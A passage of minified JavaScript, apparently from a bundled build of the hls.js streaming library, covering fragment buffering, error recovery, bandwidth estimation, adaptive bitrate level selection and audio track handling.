ya=e[sa];"main"===ya.id?(ea=sa,K=ya,"video"===sa&&(ya=e[sa])&&(this.videoBuffer=ya.buffer)):y=!0}y&&K?(this.log("Alternate track found, use "+ea+".buffered to schedule main fragment loading"),this.mediaBuffer=K.buffer):this.mediaBuffer=this.media},k.onFragBuffered=function(e,y){if(e=y.frag,y=y.part,!e||e.type===lb.MAIN){if(this.fragContextChanged(e))return this.warn("Fragment "+e.sn+(y?" p: "+y.index:"")+" of level "+e.level+" finished buffering, but was aborted. state: "+this.state),void("PARSED"===this.state&&(this.state="IDLE"));var K=y?y.stats:e.stats;this.fragLastKbps=Math.round(8*K.total/(K.buffering.end-K.loading.first)),"initSegment"!==e.sn&&(this.fragPrevious=e),this.fragBufferedComplete(e,y)}},k.onError=function(e,y){switch(y.details){case Ka.a.FRAG_LOAD_ERROR:case Ka.a.FRAG_LOAD_TIMEOUT:case Ka.a.KEY_LOAD_ERROR:case Ka.a.KEY_LOAD_TIMEOUT:this.onFragmentOrKeyLoadError(lb.MAIN,y);break;case Ka.a.LEVEL_LOAD_ERROR:case Ka.a.LEVEL_LOAD_TIMEOUT:"ERROR"!==this.state&&(y.fatal?(this.warn(""+y.details),this.state="ERROR"):y.levelRetry||"WAITING_LEVEL"!==this.state||(this.state="IDLE"));break;case Ka.a.BUFFER_FULL_ERROR:"main"!==y.parent||"PARSING"!==this.state&&"PARSED"!==this.state||(this.media&&dc.isBuffered(this.media,this.media.currentTime)&&dc.isBuffered(this.media,this.media.currentTime+.5)?(this.reduceMaxBufferLength(),this.state="IDLE"):(this.warn("buffer full error also media.currentTime is not buffered, flush everything"),this.immediateLevelSwitch()))}},k.checkBuffer=function(){var e=this.media,y=this.gapController;if(e&&y&&e.readyState){var K=dc.getBuffered(e);!this.loadedmetadata&&K.length?(this.loadedmetadata=!0,this.seekToStartPos()):y.poll(this.lastCurrentTime),this.lastCurrentTime=e.currentTime}},k.onFragLoadEmergencyAborted=function(){this.state="IDLE",this.loadedmetadata||(this.startFragRequested=!1,this.nextLoadPosition=this.startPosition),this.tick()},k.onBufferFlushed=function(e,y){((e=y.type)!==Eb.a.AUDIO||this.audioOnly&&!this.altAudio)&&this.afterBufferFlushed((e===Eb.a.VIDEO?this.videoBuffer:this.mediaBuffer)||this.media,e)},k.onLevelsUpdated=function(e,y){this.levels=y.levels},k.swapAudioCodec=function(){this.audioCodecSwap=!this.audioCodecSwap},k.seekToStartPos=function(){var e=this.media,y=e.currentTime,K=this.startPosition;if(0<=K&&y<K){if(e.seeking)return void Fa.b.log("could not seek to "+K+", already seeking at "+y);var ea=dc.getBuffered(e);0<(ea=(ea.length?ea.start(0):0)-K)&&ea<this.config.maxBufferHole&&(Fa.b.log("adjusting start position by "+ea+" to match buffer start"),K+=ea,this.startPosition=K),this.log("seek to target start position "+K+" from current time "+y),e.currentTime=K}},k._getAudioCodec=function(e){return e=this.config.defaultAudioCodec||e.audioCodec,this.audioCodecSwap&&e&&(this.log("Swapping audio codec"),e=-1!==e.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),e},k._loadBitrateTestFrag=function(e){var y=this;this._doFragLoad(e).then((function(K){var ea=y.hls;if(K&&!ea.nextLoadLevel&&!y.fragContextChanged(e)){y.fragLoadError=0,y.state="IDLE",y.startFragRequested=!1,y.bitrateTest=!1;var sa=e.stats;sa.parsing.start=sa.parsing.end=sa.buffering.start=sa.buffering.end=self.performance.now(),ea.trigger(ua.a.FRAG_LOADED,K)}}))},k._handleTransmuxComplete=function(e){var y,K=this.hls,ea=e.remuxResult;e=e.chunkMeta;var sa=this.getCurrentContext(e);if(!sa)return this.warn("The loading context changed while buffering fragment "+e.sn+" of level "+e.level+". This chunk will not be buffered."),void this.resetLiveStartWhenNotLoaded(e.level);var ya=sa.frag,Ea=sa.part,Ha=sa.level,Ua=ea.video;sa=ea.text;var kb=ea.id3,cb=ea.initSegment,ub=this.altAudio?void 0:ea.audio;if(!this.fragContextChanged(ya)){if(this.state="PARSING",cb){cb.tracks&&(this._bufferInitSegment(Ha,cb.tracks,ya,e),K.trigger(ua.a.FRAG_PARSING_INIT_SEGMENT,{frag:ya,id:"main",tracks:cb.tracks}));var gb=cb.initPTS;cb=cb.timescale,Object($a.a)(gb)&&(this.initPTS[ya.cc]=gb,K.trigger(ua.a.INIT_PTS_FOUND,{frag:ya,id:"main",initPTS:gb,timescale:cb}))}if(Ua&&!1!==ea.independent){if(Ha.details){if(ea=Ua.startPTS,Ha=Ua.endPTS,gb=Ua.startDTS,cb=Ua.endDTS,Ea)Ea.elementaryStreams[Ua.type]={startPTS:ea,endPTS:Ha,startDTS:gb,endDTS:cb};else if(Ua.dropped&&Ua.independent){if(this.getLoadPosition()+this.config.maxBufferHole<ea)return void this.backtrack(ya);ya.setElementaryStreamInfo(Ua.type,ya.start,Ha,ya.start,cb,!0)}ya.setElementaryStreamInfo(Ua.type,ea,Ha,gb,cb),this.bufferFragmentData(Ua,ya,Ea,e)}}else if(!1===ea.independent)return void this.backtrack(ya);ub&&(Ua=ub.startPTS,ea=ub.endPTS,Ha=ub.startDTS,gb=ub.endDTS,Ea&&(Ea.elementaryStreams[Eb.a.AUDIO]={startPTS:Ua,endPTS:ea,startDTS:Ha,endDTS:gb}),ya.setElementaryStreamInfo(Eb.a.AUDIO,Ua,ea,Ha,gb),this.bufferFragmentData(ub,ya,Ea,e)),null!=kb&&null!==(y=kb.samples)&&void 0!==y&&y.length&&K.trigger(ua.a.FRAG_PARSING_METADATA,{frag:ya,id:"main",samples:kb.samples}),sa&&K.trigger(ua.a.FRAG_PARSING_USERDATA,{frag:ya,id:"main",samples:sa.samples})}},k._bufferInitSegment=function(e,y,K,ea){var sa=this;if("PARSING"===this.state){this.audioOnly=!!y.audio&&!y.video,this.altAudio&&!this.audioOnly&&delete y.audio;var ya=y.audio,Ea=y.video,Ha=y.audiovideo;if(ya){var Ua=e.audioCodec,kb=navigator.userAgent.toLowerCase();this.audioCodecSwitch&&(Ua&&(Ua=-1!==Ua.indexOf("mp4a.40.5")?"mp4a.40.2":"mp4a.40.5"),1!==ya.metadata.channelCount&&-1===kb.indexOf("firefox")&&(Ua="mp4a.40.5")),-1!==kb.indexOf("android")&&"audio/mpeg"!==ya.container&&(Ua="mp4a.40.2",this.log("Android: force audio codec to "+Ua)),e.audioCodec&&e.audioCodec!==Ua&&this.log('Swapping manifest audio codec "'+e.audioCodec+'" for "'+Ua+'"'),ya.levelCodec=Ua,ya.id="main",this.log("Init audio buffer, container:"+ya.container+", codecs[selected/level/parsed]=["+(Ua||"")+"/"+(e.audioCodec||"")+"/"+ya.codec+"]")}Ea&&(Ea.levelCodec=e.videoCodec,Ea.id="main",this.log("Init video buffer, container:"+Ea.container+", codecs[level/parsed]=["+(e.videoCodec||"")+"/"+Ea.codec+"]")),Ha&&this.log("Init audiovideo buffer, container:"+Ha.container+", codecs[level/parsed]=["+(e.attrs.CODECS||"")+"/"+Ha.codec+"]"),this.hls.trigger(ua.a.BUFFER_CODECS,y),Object.keys(y).forEach((function(cb){var ub=y[cb].initSegment;null!=ub&&ub.byteLength&&sa.hls.trigger(ua.a.BUFFER_APPENDING,{type:cb,data:ub,frag:K,part:null,chunkMeta:ea,parent:K.type})})),this.tick()}},k.backtrack=function(e){this.resetTransmuxer(),this.flushBufferGap(e);var y=this.fragmentTracker.backtrack(e);this.fragPrevious=null,this.nextLoadPosition=e.start,y?this.resetFragmentLoading(e):this.state="BACKTRACKING"},k.checkFragmentChanged=function(){var e=this.media,y=null;if(e&&1<e.readyState&&!1===e.seeking){var K=e.currentTime;dc.isBuffered(e,K)?y=this.getAppendedFrag(K):dc.isBuffered(e,K+.1)&&(y=this.getAppendedFrag(K+.1)),y&&(e=this.fragPlaying,K=y.level,e&&y.sn===e.sn&&e.level===K&&y.urlId===e.urlId||(this.hls.trigger(ua.a.FRAG_CHANGED,{frag:y}),e&&e.level===K||this.hls.trigger(ua.a.LEVEL_SWITCHED,{level:K}),this.fragPlaying=y))}},n=[{key:"nextLevel",get:function(){var e=this.nextBufferedFrag;return e?e.level:-1}},{key:"currentLevel",get:function(){var e=this.media;return e&&(e=this.getAppendedFrag(e.currentTime))?e.level:-1}},{key:"nextBufferedFrag",get:function(){var e=this.media;return e?(e=this.getAppendedFrag(e.currentTime),this.followingBufferedFrag(e)):null}},{key:"forceStartLoad",get:function(){return this._forceStartLoad}}],function na(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(mc),vd=function(){function ta(n,k,e){void 0===k&&(k=0),void 0===e&&(e=0),this.totalWeight_=this.estimate_=this.alpha_=void 0,this.alpha_=(this.halfLife=n)?Math.exp(Math.log(.5)/n):0,this.estimate_=k,this.totalWeight_=e}var ca=ta.prototype;return ca.sample=function(n,k){var e=Math.pow(this.alpha_,n);this.estimate_=k*(1-e)+e*this.estimate_,this.totalWeight_+=n},ca.getTotalWeight=function(){return this.totalWeight_},ca.getEstimate=function(){if(this.alpha_){var n=1-Math.pow(this.alpha_,this.totalWeight_);if(n)return this.estimate_/n}return this.estimate_},ta}(),zb=function(){function ta(n,k,e){this.fast_=this.slow_=void 0,this.defaultEstimate_=e,this.minWeight_=.001,this.minDelayMs_=50,this.slow_=new vd(n),this.fast_=new vd(k)}var ca=ta.prototype;return ca.update=function(n,k){var e=this.slow_,y=this.fast_;this.slow_.halfLife!==n&&(this.slow_=new vd(n,e.getEstimate(),e.getTotalWeight())),this.fast_.halfLife!==k&&(this.fast_=new vd(k,y.getEstimate(),y.getTotalWeight()))},ca.sample=function(n,k){k=8*k/(n=Math.max(n,this.minDelayMs_)/1e3),this.fast_.sample(n,k),this.slow_.sample(n,k)},ca.canEstimate=function(){var n=this.fast_;return n&&n.getTotalWeight()>=this.minWeight_},ca.getEstimate=function(){return this.canEstimate()?Math.min(this.fast_.getEstimate(),this.slow_.getEstimate()):this.defaultEstimate_},ca.destroy=function(){},ta}(),ed=function(){function ta(k){this.hls=void 0,this.lastLoadedFragLevel=0,this._nextAutoLevel=-1,this.timer=void 0,this.onCheck=this._abandonRulesCheck.bind(this),this.partCurrent=this.fragCurrent=null,this.bitrateTestDelay=0,this.bwEstimator=void 0,this.hls=k,k=k.config,this.bwEstimator=new zb(k.abrEwmaSlowVoD,k.abrEwmaFastVoD,k.abrEwmaDefaultEstimate),this.registerListeners()}var ca,n=ta.prototype;return n.registerListeners=function(){var k=this.hls;k.on(ua.a.FRAG_LOADING,this.onFragLoading,this),k.on(ua.a.FRAG_LOADED,this.onFragLoaded,this),k.on(ua.a.FRAG_BUFFERED,this.onFragBuffered,this),k.on(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),k.on(ua.a.ERROR,this.onError,this)},n.unregisterListeners=function(){var k=this.hls;k.off(ua.a.FRAG_LOADING,this.onFragLoading,this),k.off(ua.a.FRAG_LOADED,this.onFragLoaded,this),k.off(ua.a.FRAG_BUFFERED,this.onFragBuffered,this),k.off(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),k.off(ua.a.ERROR,this.onError,this)},n.destroy=function(){this.unregisterListeners(),this.clearTimer(),this.fragCurrent=this.partCurrent=this.hls=this.onCheck=null},n.onFragLoading=function(k,e){var y;(k=e.frag).type===lb.MAIN&&(this.timer||(this.fragCurrent=k,this.partCurrent=null!=(y=e.part)?y:null,this.timer=self.setInterval(this.onCheck,100)))},n.onLevelLoaded=function(k,e){k=this.hls.config,e.details.live?this.bwEstimator.update(k.abrEwmaSlowLive,k.abrEwmaFastLive):this.bwEstimator.update(k.abrEwmaSlowVoD,k.abrEwmaFastVoD)},n._abandonRulesCheck=function(){var k=this.fragCurrent,e=this.partCurrent,y=this.hls,K=y.autoLevelEnabled,ea=y.config,sa=y.media;if(k&&sa){var ya=e?e.stats:k.stats,Ea=e?e.duration:k.duration;if(ya.aborted)return Fa.b.warn("frag loader destroy or aborted, disarm abandonRules"),this.clearTimer(),void(this._nextAutoLevel=-1);if(K&&!sa.paused&&sa.playbackRate&&sa.readyState){K=performance.now()-ya.loading.start;var Ha=Math.abs(sa.playbackRate);if(!(K<=500*Ea/Ha)){var Ua=y.levels,kb=y.minAutoLevel,cb=Ua[k.level],ub=Math.max(1,ya.bwEstimate?ya.bwEstimate/8:1e3*ya.loaded/K);cb=((ya.total||Math.max(ya.loaded,Math.round(Ea*cb.maxBitrate/8)))-ya.loaded)/ub;var gb=sa.currentTime;if(!((ea=(dc.bufferInfo(sa,gb,ea.maxBufferHole).end-gb)/Ha)>=2*Ea/Ha||cb<=ea)){for(Ha=Number.POSITIVE_INFINITY,sa=k.level-1;sa>kb&&!((Ha=Ea*Ua[sa].maxBitrate/(6.4*ub))<ea);sa--);Ha>=cb||(Ea=this.bwEstimator.getEstimate(),Fa.b.warn("Fragment "+k.sn+(e?" part "+e.index:"")+" of level "+k.level+" is loading too slowly and will cause an underbuffer; aborting and switching to level "+sa+"\n      Current BW estimate: "+(Object($a.a)(Ea)?(Ea/1024).toFixed(3):"Unknown")+" Kb/s\n      Estimated load time for current fragment: "+cb.toFixed(3)+" s\n      Estimated load time for the next fragment: "+Ha.toFixed(3)+" s\n      Time to underbuffer: "+ea.toFixed(3)+" s"),y.nextLoadLevel=sa,this.bwEstimator.sample(K,ya.loaded),this.clearTimer(),k.loader&&(this.fragCurrent=this.partCurrent=null,k.loader.abort()),y.trigger(ua.a.FRAG_LOAD_EMERGENCY_ABORTED,{frag:k,part:e,stats:ya}))}}}}},n.onFragLoaded=function(k,e){if(k=e.frag,e=e.part,k.type===lb.MAIN&&Object($a.a)(k.sn)){var y=e?e.stats:k.stats,K=e?e.duration:k.duration;if(this.clearTimer(),this.lastLoadedFragLevel=k.level,this._nextAutoLevel=-1,this.hls.config.abrMaxWithRealBitrate){var ea=this.hls.levels[k.level],sa=(ea.loaded?ea.loaded.bytes:0)+y.loaded;K=(ea.loaded?ea.loaded.duration:0)+K,ea.loaded={bytes:sa,duration:K},ea.realBitrate=Math.round(8*sa/K)}k.bitrateTest&&(this.onFragBuffered(ua.a.FRAG_BUFFERED,{stats:y,frag:k,part:e,id:k.type}),k.bitrateTest=!1)}},n.onFragBuffered=function(k,e){if(k=e.frag,!(e=(e=e.part)?e.stats:k.stats).aborted&&k.type===lb.MAIN&&"initSegment"!==k.sn){var y=e.parsing.end-e.loading.start;this.bwEstimator.sample(y,e.loaded),e.bwEstimate=this.bwEstimator.getEstimate(),k.bitrateTest?this.bitrateTestDelay=y/1e3:this.bitrateTestDelay=0}},n.onError=function(k,e){switch(e.details){case Ka.a.FRAG_LOAD_ERROR:case Ka.a.FRAG_LOAD_TIMEOUT:this.clearTimer()}},n.clearTimer=function(){self.clearInterval(this.timer),this.timer=void 0},n.getNextABRAutoLevel=function(){var k=this.fragCurrent,e=this.partCurrent,y=this.hls,K=y.maxAutoLevel,ea=y.config,sa=y.minAutoLevel;y=y.media,k=e?e.duration:k?k.duration:0;var ya=y?y.currentTime:0,Ea=y&&0!==y.playbackRate?Math.abs(y.playbackRate):1;if(e=this.bwEstimator?this.bwEstimator.getEstimate():ea.abrEwmaDefaultEstimate,y=(dc.bufferInfo(y,ya,ea.maxBufferHole).end-ya)/Ea,0<=(ya=this.findBestLevel(e,sa,K,y,ea.abrBandWidthFactor,ea.abrBandWidthUpFactor)))return ya;Fa.b.trace((y?"rebuffering expected":"buffer is empty")+", finding optimal quality level"),Ea=k?Math.min(k,ea.maxStarvationDelay):ea.maxStarvationDelay;var Ha=ea.abrBandWidthFactor,Ua=ea.abrBandWidthUpFactor;if(!y){var kb=this.bitrateTestDelay;kb&&(Ea=(k?Math.min(k,ea.maxLoadingDelay):ea.maxLoadingDelay)-kb,Fa.b.trace("bitrate test took "+Math.round(1e3*kb)+"ms, set first fragment max fetchDuration to "+Math.round(1e3*Ea)+" ms"),Ha=Ua=1)}return ya=this.findBestLevel(e,sa,K,y+Ea,Ha,Ua),Math.max(ya,0)},n.findBestLevel=function(k,e,y,K,ea,sa){var ya,Ea=this.fragCurrent,Ha=this.partCurrent,Ua=this.lastLoadedFragLevel,kb=this.hls.levels,cb=kb[Ua],ub=!(null==cb||null===(ya=cb.details)||void 0===ya||!ya.live);for(ya=null==cb?void 0:cb.codecSet,Ea=Ha?Ha.duration:Ea?Ea.duration:0;y>=e;y--)if((cb=kb[y])&&(!ya||cb.codecSet===ya)){cb=cb.details,cb=(Ha?null==cb?void 0:cb.partTarget:null==cb?void 0:cb.averagetargetduration)||Ea;var gb=y<=Ua?ea*k:sa*k,Gb=kb[y].maxBitrate,wb=Gb*cb/gb;if(Fa.b.trace("level/adjustedbw/bitrate/avgDuration/maxFetchDuration/fetchDuration: "+y+"/"+Math.round(gb)+"/"+Gb+"/"+cb+"/"+K+"/"+wb),gb>Gb&&(!wb||ub&&!this.bitrateTestDelay||wb<K))return y}return-1},ca=[{key:"nextAutoLevel",get:function(){var k=this._nextAutoLevel,e=this.bwEstimator;return-1===k||e&&e.canEstimate()?(e=this.getNextABRAutoLevel(),-1!==k&&(e=Math.min(k,e)),e):k},set:function(k){this._nextAutoLevel=k}}],function pa(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ta.prototype,ca),ta}(),wd=Na(12),ie=function(ta){function ca(k,e){var y;return(y=ta.call(this,k,e,"[audio-stream-controller]")||this).videoBuffer=null,y.videoTrackCC=-1,y.waitingVideoCC=-1,y.audioSwitch=!1,y.trackId=-1,y.waitingData=null,y.mainDetails=null,y._registerListeners(),y}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,S(ca,ta);var n=ca.prototype;return n.onHandlerDestroying=function(){this._unregisterListeners(),this.mainDetails=null},n._registerListeners=function(){var k=this.hls;k.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),k.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),k.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),k.on(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),k.on(ua.a.AUDIO_TRACKS_UPDATED,this.onAudioTracksUpdated,this),k.on(ua.a.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),k.on(ua.a.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),k.on(ua.a.ERROR,this.onError,this),k.on(ua.a.BUFFER_RESET,this.onBufferReset,this),k.on(ua.a.BUFFER_CREATED,this.onBufferCreated,this),k.on(ua.a.BUFFER_FLUSHED,this.onBufferFlushed,this),k.on(ua.a.INIT_PTS_FOUND,this.onInitPtsFound,this),k.on(ua.a.FRAG_BUFFERED,this.onFragBuffered,this)},n._unregisterListeners=function(){var k=this.hls;k.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),k.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),k.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),k.off(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),k.off(ua.a.AUDIO_TRACKS_UPDATED,this.onAudioTracksUpdated,this),k.off(ua.a.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),k.off(ua.a.AUDIO_TRACK_LOADED,this.onAudioTrackLoaded,this),k.off(ua.a.ERROR,this.onError,this),k.off(ua.a.BUFFER_RESET,this.onBufferReset,this),k.off(ua.a.BUFFER_CREATED,this.onBufferCreated,this),k.off(ua.a.BUFFER_FLUSHED,this.onBufferFlushed,this),k.off(ua.a.INIT_PTS_FOUND,this.onInitPtsFound,this),k.off(ua.a.FRAG_BUFFERED,this.onFragBuffered,this)},n.onInitPtsFound=function(k,e){k=e.frag;var y=e.initPTS;"main"===e.id&&(e=k.cc,this.initPTS[k.cc]=y,this.log("InitPTS for cc: "+e+" found from main: "+y),this.videoTrackCC=e,"WAITING_INIT_PTS"===this.state&&this.tick())},n.startLoad=function(k){if(!this.levels)return this.startPosition=k,void(this.state="STOPPED");var e=this.lastCurrentTime;this.stopLoad(),this.setInterval(100),this.fragLoadError=0,0<e&&-1===k?(this.log("Override startPosition with lastCurrentTime @"+e.toFixed(3)),this.state="IDLE"):(this.loadedmetadata=!1,this.state="WAITING_TRACK"),this.nextLoadPosition=this.startPosition=this.lastCurrentTime=k,this.tick()},n.doTick=function(){switch(this.state){case"IDLE":this.doTickIdle();break;case"WAITING_TRACK":var k,e=this.levels,y=this.trackId;(e=null==e||null===(k=e[y])||void 0===k?void 0:k.details)&&!this.waitForCdnTuneIn(e)&&(this.state="WAITING_INIT_PTS");break;case"FRAG_LOADING_WAITING_RETRY":k=performance.now(),(!(y=this.retryDate)||k>=y||null!==(e=this.media)&&void 0!==e&&e.seeking)&&(this.log("RetryDate reached, switch back to IDLE state"),this.state="IDLE");break;case"WAITING_INIT_PTS":var K=this.waitingData;K?(k=K.frag,e=K.part,y=K.cache,K=K.complete,void 0!==this.initPTS[k.cc]?(this.waitingData=null,this.state="FRAG_LOADING",k={frag:k,part:e,payload:y.flush(),networkDetails:null},this._handleFragmentLoadProgress(k),K&&ta.prototype._handleFragmentLoadComplete.call(this,k)):this.videoTrackCC!==this.waitingVideoCC?(Fa.b.log("Waiting fragment cc ("+k.cc+") cancelled because video is at cc "+this.videoTrackCC),this.clearWaitingFragment()):0>ja((e=dc.bufferInfo(this.mediaBuffer,this.media.currentTime,this.config.maxBufferHole)).end,this.config.maxFragLookUpTolerance,k)&&(Fa.b.log("Waiting fragment cc ("+k.cc+") @ "+k.start+" cancelled because another fragment at "+e.end+" is needed"),this.clearWaitingFragment())):this.state="IDLE"}this.onTickEnd()},n.clearWaitingFragment=function(){var k=this.waitingData;k&&(this.fragmentTracker.removeFragment(k.frag),this.waitingData=null,this.waitingVideoCC=-1,this.state="IDLE")},n.onTickEnd=function(){var k=this.media;if(k&&k.readyState){var e=(this.mediaBuffer?this.mediaBuffer:k).buffered;!this.loadedmetadata&&e.length&&(this.loadedmetadata=!0),this.lastCurrentTime=k.currentTime}},n.doTickIdle=function(){var k,e,y=this.hls,K=this.levels,ea=this.media,sa=this.trackId,ya=y.config;if(K&&K[sa]&&(ea||!this.startFragRequested&&ya.startFragPrefetch)){var Ea=this.getLoadPosition();if(Object($a.a)(Ea))if(!(K=K[sa].details)||K.live&&this.levelLastLoaded!==sa||this.waitForCdnTuneIn(K))this.state="WAITING_TRACK";else{var Ha=K.initSegment,Ua=0;if(!Ha||Ha.data){var kb=this.videoBuffer?this.videoBuffer:this.media,cb=Ea<ya.maxBufferHole?Math.max(2,ya.maxBufferHole):ya.maxBufferHole;if(Ha=dc.bufferInfo(this.mediaBuffer?this.mediaBuffer:this.media,Ea,cb),cb=dc.bufferInfo(kb,Ea,cb),kb=this.audioSwitch,Ha.len>=Math.max(Math.min(ya.maxBufferLength,ya.maxMaxBufferLength),cb.len)&&!kb)return;if(!kb&&this._streamEnded(Ha,K))return y.trigger(ua.a.BUFFER_EOS,{type:"audio"}),void(this.state="ENDED");if(ya=K.fragments[0].start,Ua=Ha.end,kb&&(Ua=Ea,K.PTSKnown&&Ea<ya&&(Ha.end>ya||Ha.nextStart)&&(this.log("Alt audio track ahead of main track, seek to start of alt audio track"),ea.currentTime=ya+.05)),!(Ha=this.getNextFragment(Ua,K)))return}"identity"!==(null===(k=Ha.decryptdata)||void 0===k?void 0:k.keyFormat)||null!==(e=Ha.decryptdata)&&void 0!==e&&e.key?this.loadFragment(Ha,K,Ua):(this.log("Loading key for "+Ha.sn+" of ["+K.startSN+" ,"+K.endSN+"],track "+sa),this.state="KEY_LOADING",y.trigger(ua.a.KEY_LOADING,{frag:Ha}))}}},n.onMediaDetaching=function(){this.videoBuffer=null,ta.prototype.onMediaDetaching.call(this)},n.onAudioTracksUpdated=function(k,e){k=e.audioTracks,this.resetTransmuxer(),this.levels=k.map((function(y){return new Fb(y)}))},n.onAudioTrackSwitching=function(k,e){k=!!e.url,this.trackId=e.id,null!=(e=this.fragCurrent)&&e.loader&&e.loader.abort(),this.fragCurrent=null,this.clearWaitingFragment(),k?this.setInterval(100):this.resetTransmuxer(),k?(this.audioSwitch=!0,this.state="IDLE"):this.state="STOPPED",this.tick()},n.onManifestLoading=function(){this.mainDetails=null,this.fragmentTracker.removeAllFragments(),this.startPosition=this.lastCurrentTime=0},n.onLevelLoaded=function(k,e){null===this.mainDetails&&(k=this.mainDetails=e.details,null!==(e=this.levelLastLoaded)&&this.levels&&-1===this.startPosition&&k.live&&(e=this.levels[e]).details&&e.details.fragments[0]&&(O(e.details,k),this.setStartPosition(e.details,e.details.fragments[0].start)))},n.onAudioTrackLoaded=function(k,e){var y,K=this.levels;if(k=e.details,e=e.id,K){this.log("Track "+e+" loaded ["+k.startSN+","+k.endSN+"],duration:"+k.totalduration),K=K[e];var ea=0;if(k.live||null!==(y=K.details)&&void 0!==y&&y.live){var sa;if(k.fragments[0]||(k.deltaUpdateFailed=!0),k.deltaUpdateFailed)return;!K.details&&null!==(sa=this.mainDetails)&&void 0!==sa&&sa.hasProgramDateTime&&k.hasProgramDateTime?(O(k,this.mainDetails),ea=k.fragments[0].start):ea=this.alignPlaylists(k,K.details)}K.details=k,this.levelLastLoaded=e,this.startFragRequested||!this.mainDetails&&k.live||this.setStartPosition(K.details,ea),"WAITING_TRACK"!==this.state||this.waitForCdnTuneIn(k)||(this.state="IDLE"),this.tick()}else this.warn("Audio tracks were reset while loading level "+e)},n._handleFragmentLoadProgress=function(k){var e,y=k.frag,K=k.part;k=k.payload;var ea=this.config,sa=this.trackId,ya=this.levels;if(ya){var Ea=ya[sa];ya=Ea.details,ea=ea.defaultAudioCodec||Ea.audioCodec||"mp4a.40.2",(Ea=this.transmuxer)||(Ea=this.transmuxer=new md(this.hls,lb.AUDIO,this._handleTransmuxComplete.bind(this),this._handleTransmuxerFlush.bind(this)));var Ha=this.initPTS[y.cc],Ua=null===(e=ya.initSegment)||void 0===e?void 0:e.data;void 0!==Ha?(e=K?K.index:-1,e=new Hc(y.level,y.sn,y.stats.chunkCount,k.byteLength,e,-1!==e),Ea.push(k,Ua,ea,"",y,K,ya.totalduration,!1,e,Ha)):(Fa.b.log("Unknown video PTS for cc "+y.cc+", waiting for video PTS before demuxing audio frag "+y.sn+" of ["+ya.startSN+" ,"+ya.endSN+"],track "+sa),(this.waitingData=this.waitingData||{frag:y,part:K,cache:new wd.a,complete:!1}).cache.push(new Uint8Array(k)),this.waitingVideoCC=this.videoTrackCC,this.state="WAITING_INIT_PTS")}else this.warn("Audio tracks were reset while fragment load was in progress. Fragment "+y.sn+" of level "+y.level+" will not be buffered")},n._handleFragmentLoadComplete=function(k){this.waitingData?this.waitingData.complete=!0:ta.prototype._handleFragmentLoadComplete.call(this,k)},n.onBufferReset=function(){this.mediaBuffer=this.videoBuffer=null,this.loadedmetadata=!1},n.onBufferCreated=function(k,e){(k=e.tracks.audio)&&(this.mediaBuffer=k.buffer),e.tracks.video&&(this.videoBuffer=e.tracks.video.buffer)},n.onFragBuffered=function(k,e){k=e.frag,e=e.part,k.type===lb.AUDIO&&(this.fragContextChanged(k)?this.warn("Fragment "+k.sn+(e?" p: "+e.index:"")+" of level "+k.level+" finished buffering, but was aborted. state: "+this.state+", audioSwitch: "+this.audioSwitch):("initSegment"!==k.sn&&(this.fragPrevious=k,this.audioSwitch&&(this.audioSwitch=!1,this.hls.trigger(ua.a.AUDIO_TRACK_SWITCHED,{id:this.trackId}))),this.fragBufferedComplete(k,e)))},n.onError=function(k,e){switch(e.details){case Ka.a.FRAG_LOAD_ERROR:case Ka.a.FRAG_LOAD_TIMEOUT:case Ka.a.KEY_LOAD_ERROR:case Ka.a.KEY_LOAD_TIMEOUT:this.onFragmentOrKeyLoadError(lb.AUDIO,e);break;case Ka.a.AUDIO_TRACK_LOAD_ERROR:case Ka.a.AUDIO_TRACK_LOAD_TIMEOUT:"ERROR"!==this.state&&"STOPPED"!==this.state&&(this.state=e.fatal?"ERROR":"IDLE",this.warn(e.details+" while loading frag, switching to "+this.state+" state"));break;case Ka.a.BUFFER_FULL_ERROR:"audio"!==e.parent||"PARSING"!==this.state&&"PARSED"!==this.state||(k=this.mediaBuffer,e=this.media.currentTime,k&&dc.isBuffered(k,e)&&dc.isBuffered(k,e+.5)?(this.reduceMaxBufferLength(),this.state="IDLE"):(this.warn("Buffer full error also media.currentTime is not buffered, flush audio buffer"),this.fragCurrent=null,ta.prototype.flushMainBuffer.call(this,0,Number.POSITIVE_INFINITY,"audio")))}},n.onBufferFlushed=function(k,e){(k=e.type)===Eb.a.AUDIO&&this.afterBufferFlushed(this.mediaBuffer?this.mediaBuffer:this.media,k)},n._handleTransmuxComplete=function(k){var e,y=this.hls,K=k.remuxResult,ea=k.chunkMeta,sa=this.getCurrentContext(ea);if(!sa)return this.warn("The loading context changed while buffering fragment "+ea.sn+" of level "+ea.level+". This chunk will not be buffered."),void this.resetLiveStartWhenNotLoaded(ea.level);k=sa.frag;var ya=sa.part,Ea=K.audio;sa=K.text;var Ha=K.id3;if(K=K.initSegment,!this.fragContextChanged(k)){if(this.state="PARSING",this.audioSwitch&&Ea&&this.completeAudioSwitch(),null!=K&&K.tracks&&(this._bufferInitSegment(K.tracks,k,ea),y.trigger(ua.a.FRAG_PARSING_INIT_SEGMENT,{frag:k,id:"audio",tracks:K.tracks})),Ea){K=Ea.startPTS;var 